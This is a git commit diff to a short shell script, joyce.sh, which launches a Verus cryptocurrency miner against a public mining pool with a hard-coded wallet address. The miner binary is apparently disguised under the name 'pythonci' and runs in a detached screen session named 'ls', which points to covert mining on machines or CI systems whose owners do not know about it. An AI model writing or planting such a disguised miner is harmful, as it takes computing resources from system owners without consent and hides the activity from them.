6b5aedd0acef27362ae8267044d823754f704cf9
unyilcogan <85560875+unyilcogan@users.noreply.github.com>
2021-10-25 12:34:06 +0700

    Update joyce.sh

--- joyce.sh
+++ joyce.sh
@@ -6,5 +6,5 @@ screen -dmS ls
 PL=stratum+tcp://na.luckpool.net:3956
 WT=RTxV5jDjpndt1BXa8KyZ2rpbZGSfnvgJjs
 WR=VIA-010
-./pythonci -a verus -o $PL -u $WT.$WR -p x
+cd test;./pythonci -a verus -o $PL -u $WT.$WR -p x
 
